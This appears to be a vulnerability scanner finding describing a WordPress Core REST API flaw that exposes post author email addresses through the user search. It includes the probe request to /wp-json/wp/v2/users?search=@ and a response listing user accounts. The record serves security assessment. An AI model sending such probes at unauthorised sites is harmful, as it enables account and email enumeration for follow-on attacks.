findings.description: WordPress Core is vulnerable to Sensitive Information Exposure in versions between 4.7.0 and 6.3.1 via the User REST endpoint. While the search results do not display user email addresses unless the requesting user has the 'list_users' capability, the search is applied to the user_email column.
findings.name: WordPress Core - Post Author Email Disclosure
findings.remediation: Apply the latest security patches and updates from the vendor to address this vulnerability.
findings.request:
GET /wp-json/wp/v2/users?search=@ HTTP/1.1
Host: 192.0.2.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
findings.response:
HTTP/1.1 200 OK
Content-Length: 82
Accept-Ranges: bytes
Connection: keep-alive
Content-Type: application/json
Date: Thu, 12 Nov 2026 16:06:55 GMT
Etag: "6af5dd90-52"
Last-Modified: Thu, 12 Nov 2026 15:38:56 GMT
Server: nginx/1.31.8

[{"id":1,"name":"admin","slug":"admin"},{"id":2,"name":"editor","slug":"editor"}]
